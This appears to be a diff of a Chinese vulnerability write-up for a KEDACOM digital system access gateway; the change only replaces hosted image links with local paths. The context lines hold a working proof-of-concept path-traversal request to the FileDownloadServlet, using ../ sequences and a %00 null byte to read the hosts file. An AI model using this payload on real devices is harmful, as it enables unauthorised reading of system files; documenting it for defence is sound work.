@@ -20,7 +20,7 @@ KEDACOM 数字系统接入网关
 
 登录页面如下
 
-![](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202162300072.png)
+![](./images/202202162300072.png)
 
 使用POC读取 /etc/hosts
 
@@ -28,4 +28,4 @@ KEDACOM 数字系统接入网关
 /gatewayweb/FileDownloadServlet?fileName=test.txt&filePath=../../../../../../../../../../Windows/System32/drivers/etc/hosts%00.jpg&type=2
 ```
 
-![](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202162300019.png)
+![](./images/202202162300019.png)
